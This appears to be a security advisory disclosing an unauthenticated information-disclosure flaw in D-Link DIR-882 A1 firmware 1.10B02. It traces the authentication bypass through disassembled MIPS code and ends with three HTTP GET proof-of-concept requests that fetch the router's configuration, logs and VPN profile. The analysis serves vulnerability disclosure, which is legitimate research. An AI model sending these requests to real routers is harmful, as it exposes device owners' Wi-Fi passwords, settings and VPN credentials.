# D-Link DIR-882 A1 HNAP1 Allow-Listed CGI Endpoints Unauthenticated Sensitive Information Disclosure

## 1. Vulnerability Name

**D-Link DIR-882 A1 Firmware 1.10B02 HNAP1 Allow-Listed CGI Endpoints Allow Unauthenticated Sensitive Information Disclosure**

## 2. Basic Information

| Field | Content |
| --- | --- |
| **Vendor** | D-Link |
| **Product** | DIR-882 A1 AC2600 MU-MIMO Wi-Fi Router |
| **Firmware Version** | 1.10B02 |
| **Firmware File** | DIR882A1_FW110B02.bin |

## 3. Vulnerability Principle & Data Flow

The HNAP1 authentication logic in `/bin/prog.cgi` contains a download-URL allow-list check function `sub_423CA8`. This function uses `sscanf(url, "/HNAP1/%s", buf)` to extract the CGI name from the attacker-controlled request path and compares it against the hard-coded allow-list table `downloadurls` via `strcmp`. The allow-list contains `dlcfg.cgi`, `dllog.cgi`, `dlquickvpnsettings.cgi`. When a request hits the allow-list, the auth dispatch (`sub_423E04`) returns `1` and authentication is bypassed entirely; the request is then dispatched to `downloadFile`, which invokes the corresponding download handler returning configuration files, system logs, or VPN profiles — without any Cookie / HNAP_AUTH / login session.

```
HTTP GET /HNAP1/dlcfg.cgi  (no Cookie / no HNAP_AUTH / no login)
        │
        ▼
lighttpd → FastCGI → /bin/prog.cgi
        │
        ▼
websSecurityHandler @ 0x424ae0 → sub_423E04 @ 0x423e04 → sub_423CA8 @ 0x423ca8
        │  sscanf(url, "/HNAP1/%s", buf) → "dlcfg.cgi" → strcmp matches allow-list → return 1
        ▼
Auth bypassed → websFormHandler @ 0x407660 → downloadFile @ 0x42a844
        │
        ▼
handle_dlcfg_download @ 0x4297d0 → returns config.bin
        │
        ▼
Attacker receives device config / Wi-Fi password / VPN profile / system logs
```

## 4. Key Functions

| Function | Address | Role |
| --- | --- | --- |
| `websSecurityHandler` | `0x424ae0` | HNAP1 authentication entry; calls auth dispatch |
| `sub_423E04` | `0x423e04` | Auth dispatch; invokes allow-list check and bypasses on match |
| `sub_423CA8` | `0x423ca8` | Download allow-list check; `sscanf` parses attacker URL, `strcmp` matches table |
| `downloadurls` | `0x4d1f90` | Allow-list table (stride 0x40): `dlcfg.cgi`, `dllog.cgi`, `dlquickvpnsettings.cgi` |
| `downloadFile` | `0x42a844` | Matches CGI name and invokes handler from table @ `0x4d19f0` |
| `handle_dlcfg_download` | `0x4297d0` | Returns `config.bin` |
| `handle_dllog_download` | `0x42a328` | Generates and returns `messages` |
| `handle_dlquickvpnsettings_download` | `0x42a500` | Returns `vpnprofile.mobileconfig` |

### sub_423CA8 @ 0x423ca8 — allow-list check (sscanf + strcmp loop)

```asm
; sub_423CA8 @ 0x423ca8 (MIPS32 LE)
0x00423d0c:  lw       $v0, 0xe0($v0)        ; load request URL ptr
0x00423d18:  beqz     $v0, 0x423de0         ; no URL -> return 0
0x00423d40:  lui      $v0, 0x4b
0x00423d44:  addiu    $v1, $v0, -0x7428     ; $v1 -> "/HNAP1/%s" (va 0x4a8bd8)
0x00423d48:  addiu    $v0, $sp, 0x1c        ; buf
0x00423d50:  move     $a2, $v0              ; arg2 = buf
0x00423d60:  jalr     $t9                   ; sscanf(url, "/HNAP1/%s", buf)
...
0x00423d6c:  lw       $v0, 0x18($sp)        ; i
0x00423d74:  sll      $v1, $v0, 6           ; i * 64 (stride 0x40)
0x00423d78:  lw       $v0, -0x7db4($gp)     ; downloadurls table base (0x4d1f90)
0x00423d80:  addu     $v0, $v1, $v0         ; &downloadurls[i*64]
0x00423d90:  jalr     $t9                   ; strcmp(buf, &downloadurls[i*64])
0x00423da8:  bnez     $v0, 0x423dbc         ; not matched -> i++
0x00423db0:  addiu    $v0, $zero, 1         ; matched -> return 1 (BYPASS)
0x00423db4:  j        0x423de4
```

### downloadFile @ 0x42a844 — handler-table dispatch

```asm
; downloadFile @ 0x42a844 (MIPS32 LE)
0x0042a85c:  lw       $v0, 0x18($sp)        ; i
0x0042a864:  sll      $v1, $v0, 6           ; i * 64
0x0042a868:  lui      $v0, 0x4d
0x0042a86c:  addiu    $v0, $v0, 0x1930      ; downloadurls base (0x4d1930)
0x0042a870:  addu     $v0, $v1, $v0
0x0042a87c:  jalr     $t9                   ; strcmp(name, &downloadurls[i*64])
0x0042a894:  bnez     $v0, 0x42a8d8         ; not matched -> i++
0x0042a8a0:  lw       $v1, 0x18($sp)        ; matched i
0x0042a8a8:  sll      $v1, $v1, 2           ; i * 4 (handler ptr stride)
0x0042a8ac:  addiu    $v0, $v0, 0x19f0      ; handler table base (0x4d19f0)
0x0042a8b0:  addu     $v0, $v1, $v0
0x0042a8b4:  lw       $v0, ($v0)            ; load handler function pointer
0x0042a8bc:  move     $t9, $v0
0x0042a8c0:  jalr     $t9                   ; off_4D19F0[i]()  -> handler
```

```c
// decompiled
for (i = 0; i < 3; ++i) {
    if (!strcmp(buf, &downloadurls[64 * i]))   // match allow-list
        return 1;                              // bypass auth
}
// ... later in downloadFile:
for (i = 0; ; ++i) {
    if (!strcmp(name, &downloadurls[64 * i]))
        off_4D19F0[i]();                      // invoke handler pointer
}
```

### handle_dllog_download @ 0x42a328 — 4 system() calls (confirmed strings)

```asm
; handle_dllog_download @ 0x42a328 (MIPS32 LE)
0x0042a338:  lui      $v0, 0x4b
0x0042a33c:  addiu    $a0, $v0, -0x6a18     ; "cp /var/log/messages /etc_ro/lighttpd/www/web/messages"
0x0042a34c:  jalr     $t9                   ; system(...)
0x0042a35c:  addiu    $a0, $v0, -0x69e0     ; "free >> /etc_ro/lighttpd/www/web/messages"
0x0042a36c:  jalr     $t9                   ; system(...)
0x0042a37c:  addiu    $a0, $v0, -0x69b4     ; "ps >> /etc_ro/lighttpd/www/web/messages"
0x0042a38c:  jalr     $t9                   ; system(...)
0x0042a39c:  addiu    $a0, $v0, -0x698c     ; "ifconfig >> /etc_ro/lighttpd/www/web/messages"
0x0042a3a0:  lw       $v0, -0x7914($gp)     ; GOT -> system
0x0042a3a8:  move     $t9, $v0
0x0042a3ac:  jalr     $t9                   ; system(...)
```

Resolved string targets (verified at runtime via GOT-relative addressing):

| Address | String |
| --- | --- |
| `0x4a95e8` | `cp /var/log/messages /etc_ro/lighttpd/www/web/messages` |
| `0x4a9620` | `free >> /etc_ro/lighttpd/www/web/messages` |
| `0x4a964c` | `ps >> /etc_ro/lighttpd/www/web/messages` |
| `0x4a9674` | `ifconfig >> /etc_ro/lighttpd/www/web/messages` |

## 5. Test PoC

```http
GET /HNAP1/dlcfg.cgi HTTP/1.1
Host: <TARGET>
```

```http
GET /HNAP1/dllog.cgi HTTP/1.1
Host: <TARGET>
```

```http
GET /HNAP1/dlquickvpnsettings.cgi HTTP/1.1
Host: <TARGET>
```
